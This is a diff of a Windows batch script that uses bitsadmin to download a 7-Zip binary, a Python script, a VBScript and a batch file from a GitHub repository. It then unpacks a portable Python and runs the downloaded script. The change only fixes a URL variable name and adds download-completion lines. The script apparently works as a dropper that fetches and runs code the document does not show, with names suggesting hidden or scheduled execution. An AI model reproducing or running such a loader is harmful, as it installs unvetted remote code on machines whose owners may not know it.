@@ -13,7 +13,7 @@
     set url1=https://github.com/somehat/files/raw/main/7za.exe
     set url2=https://github.com/somehat/files/raw/main/touche.py
     set url3=https://github.com/somehat/files/raw/main/_hf.vbs
-    set url3=https://github.com/somehat/files/raw/main/_sc.bat
+    set url4=https://github.com/somehat/files/raw/main/_sc.bat
     set file=python.zip
     set file1=7za.exe
     set file2=touche.py
@@ -75,12 +75,17 @@
     goto :repeat
     :finishing 
     bitsadmin /complete download >nul
-    echo download finished
+    bitsadmin /complete download1 >nul
+    bitsadmin /complete download2 >nul
+    bitsadmin /complete download3 >nul
+    bitsadmin /complete download4 >nul
 
     7za.exe x python.zip
     MOVE touche.py python
     cd python
     python.exe touche.py
+
+
     endlocal
 
    goto :eof
